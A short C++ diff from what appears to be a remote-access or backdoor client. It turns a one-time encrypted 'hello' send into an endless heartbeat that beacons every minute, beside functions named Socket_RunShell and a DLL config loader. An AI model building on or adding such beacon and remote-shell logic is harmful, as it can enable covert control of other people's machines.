@@ -65,10 +65,12 @@ void ServerSocketClass::Socket_RunShell(std::string data) { //Ö´ÐÐ¶¯×÷
 	}
 }
 void ServerSocketClass::Send_Socket_While(SOCKET socket) {
-	if (!Send_Socket(sClient, EncryptData(ConfigClass::Socket_Hello))) { // Error
-		return;
+	while (1) {
+		if (!Send_Socket(sClient, EncryptData(ConfigClass::Socket_Hello))) { // Error
+			return;
+		}
+		else { ::Sleep(1000 * 60); }
 	}
-	else { ::Sleep(1000 * 60); }
 }
 std::string ServerSocketClass::GetFirstSendData() {
 	if (!ConfigDll().Loading()) { return ""; }
